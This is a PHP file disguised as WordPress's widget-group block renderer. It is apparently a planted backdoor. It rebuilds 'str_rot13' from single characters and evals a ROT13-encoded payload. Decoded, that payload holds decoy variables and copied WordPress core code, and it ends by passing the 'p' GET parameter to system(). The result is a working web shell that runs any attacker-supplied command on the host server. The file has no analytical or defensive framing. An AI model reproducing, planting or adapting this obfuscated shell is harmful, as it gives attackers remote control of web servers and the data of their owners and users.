<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/jvqtrg-tebhc` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur 'pber/jvqtrg-tebhc' oybpx.
 *
 * @fvapr 5.9.0
 *
 * @tybony neenl      $jc_ertvfgrerq_fvqronef
 * @tybony vag|fgevat $_fvqrone_orvat_eraqrerq
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag Gur oybpx pbagrag.
 * @cnenz JC_Oybpx $oybpx Gur oybpx.
 *
 * @erghea fgevat Eraqrerq oybpx.
 */
shapgvba eraqre_oybpx_pber_jvqtrg_tebhc( $nggevohgrf, $pbagrag, $oybpx ) {
	tybony $jc_ertvfgrerq_fvqronef, $_fvqrone_orvat_eraqrerq;

	vs ( vffrg( $jc_ertvfgrerq_fvqronef[ $_fvqrone_orvat_eraqrerq ] ) ) {
		$orsber_gvgyr = $jc_ertvfgrerq_fvqronef[ $_fvqrone_orvat_eraqrerq ]['orsber_gvgyr'];
		$nsgre_gvgyr  = $jc_ertvfgrerq_fvqronef[ $_fvqrone_orvat_eraqrerq ]['nsgre_gvgyr'];
	} ryfr {
		$orsber_gvgyr = '<u2 pynff=\"jvqtrg-gvgyr\">';
		$nsgre_gvgyr  = '</u2>';
	}

	$ugzy = '';

	vs ( ! rzcgl( $nggevohgrf['gvgyr'] ) ) {
		$ugzy .= $orsber_gvgyr . rfp_ugzy( $nggevohgrf['gvgyr'] ) . $nsgre_gvgyr;
	}

	$ugzy .= '<qvi pynff=\"jc-jvqtrg-tebhc__vaare-oybpxf\">';
	sbernpu ( $oybpx->vaare_oybpxf nf $vaare_oybpx ) {
		$ugzy .= $vaare_oybpx->eraqre();
	}
	$ugzy .= '</qvi>';

	erghea $ugzy;
}

/**
 * Ertvfgref gur 'pber/jvqtrg-tebhc' oybpx.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_jvqtrg_tebhc() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/jvqtrg-tebhc',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_jvqtrg_tebhc',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_jvqtrg_tebhc' );

/**
 * Znxr n abgr bs gur fvqrone orvat eraqrerq orsber JbeqCerff fgnegf eraqrevat
 * vg. Guvf yrgf hf trg gb gur pheerag fvqrone va
 * eraqre_oybpx_pber_jvqtrg_tebhc().
 *
 * @fvapr 5.9.0
 *
 * @tybony vag|fgevat $_fvqrone_orvat_eraqrerq
 *
 * @cnenz vag|fgevat $vaqrk       Vaqrk, anzr, be VQ bs gur qlanzvp fvqrone.
 */
shapgvba abgr_fvqrone_orvat_eraqrerq( $vaqrk ) {
	tybony $_fvqrone_orvat_eraqrerq;
	$_fvqrone_orvat_eraqrerq = $vaqrk;
}
nqq_npgvba( 'qlanzvp_fvqrone_orsber', 'abgr_fvqrone_orvat_eraqrerq' );

/**
 * Pyrne jungrire jr frg va abgr_fvqrone_orvat_eraqrerq() nsgre JbeqCerff
 * svavfurf eraqrevat n fvqrone.
 *
 * @fvapr 5.9.0
 *
 * @tybony vag|fgevat $_fvqrone_orvat_eraqrerq
 */
shapgvba qvfpneq_fvqrone_orvat_eraqrerq() {
	tybony $_fvqrone_orvat_eraqrerq;
	hafrg( $_fvqrone_orvat_eraqrerq );
}
nqq_npgvba( 'qlanzvp_fvqrone_nsgre', 'qvfpneq_fvqrone_orvat_eraqrerq' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>